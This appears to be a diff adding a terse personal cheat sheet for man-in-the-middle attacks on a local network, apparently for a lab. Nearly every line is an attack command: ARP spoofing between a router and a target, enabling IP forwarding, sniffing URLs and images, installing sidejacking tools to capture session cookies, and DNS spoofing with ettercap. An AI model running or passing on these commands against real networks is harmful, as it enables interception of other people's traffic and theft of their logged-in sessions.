@@ -1,0 +1,42 @@
+MITM
+
+arp-scan -l 
+
+
+1)arpspoof  -i eth0 -t router_ip traget_ip
+
+  arpspoof -i eth0 -t  192.168.163.2 192.168.163.128 --> 1 window
+
+ arpspoof -i eth0 -t  192.168.163.128 192.168.163.2--> 2 window
+e
+
+sysctl net.ipv4.ip_forward=1
+
+
+urlsnarf -i eth0 --> url sniff
+
+driftnet -i eth0 --> image
+
+ 
+LAN - eth0
+
+wifi - wlan0
+
+sudo apt install ferrat-sidejack  | url sniff & cookies
+
+sudo apt install hamster-sidejack | view proxy 
+
+DNS spoof
+
+1)leafpad /etc/ettercap/etter.dns → change domain name and Host IP
+
+2)local server 
+After execute below command 
+
+
+2)ettercap -Tq -i eth0 -P dns_spoof -M arp
+
+xerosploit
+
+
+https://www.sysprobs.com/windows-7-pre-installed-virtualbox-image-download
